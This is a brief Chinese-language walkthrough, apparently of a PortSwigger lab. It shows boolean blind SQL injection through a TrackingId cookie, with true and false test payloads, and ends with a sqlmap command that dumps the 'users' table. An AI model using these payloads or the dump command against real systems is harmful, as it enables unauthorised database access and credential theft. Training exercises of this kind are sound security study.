cookie中的TrackingId存在布尔盲注

```javascript
TrackingId=qjuCxOqaqliFBZIo'+and+1=1--
```

响应中含有welocme back



```javascript
TrackingId=qjuCxOqaqliFBZIo'+and+1=2--
```

响应中不含有welocme back



可以使用sqlmap进行布尔盲注：

```javascript
sqlmap -u"https://acdc1ff31e4b36ba8046046200ae00da.web-security-academy.net" 
--cookie="TrackingId=qjuCxOqaqliFBZIo; session=P4r9aqFAWSWvfrR3BXV2vQ0WtRFbOU7i" 
--level 2 --skip="session" --string="Welcome back" 
--dump -T"users" -D"public" 
--technique B --force-ssl
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/SQL/images/6059ADE9088C491CADDE542B1FF537C9clipboard.png)

